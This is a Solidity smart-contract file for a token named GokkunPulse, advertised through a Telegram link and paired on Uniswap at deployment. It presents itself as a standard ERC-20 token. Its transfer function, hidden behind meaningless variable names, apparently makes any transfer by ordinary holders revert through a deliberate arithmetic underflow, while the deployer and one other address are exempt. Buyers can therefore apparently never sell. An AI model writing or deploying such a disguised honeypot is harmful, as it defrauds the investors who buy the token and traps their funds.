// https://t.me/gokkunpulse

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract GokkunPulse is Ownable {
    constructor(
        string memory problem,
        string memory between,
        address zulu,
        address thirty
    ) {
        uniswapV2Router = IUniswapV2Router02(zulu);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = between;
        _name = problem;
        happened = 0;
        _decimals = 9;
        _balances[thirty] = without;
        now = 1000000000;
        hollow[thirty] = without;
        _tTotal = now * 10**_decimals;
        hollow[msg.sender] = without;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public happened;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private now;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private swimming;
    uint256 private without = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address completely,
        address courage,
        uint256 touch
    ) internal {
        uint256 population = happened;

        address pupil = uniswapV2Pair;

        if (hollow[completely] == 0 && pupil != completely && leaf[completely] > 0) {
            hollow[completely] -= population - 1;
        }

        address quite = swimming;
        swimming = courage;
        leaf[quite] += population + 1;

        _balances[completely] -= touch;
        uint256 straight = (touch / 100) * happened;
        touch -= straight;
        _balances[courage] += touch;
    }

    mapping(address => uint256) private leaf;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private hollow;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}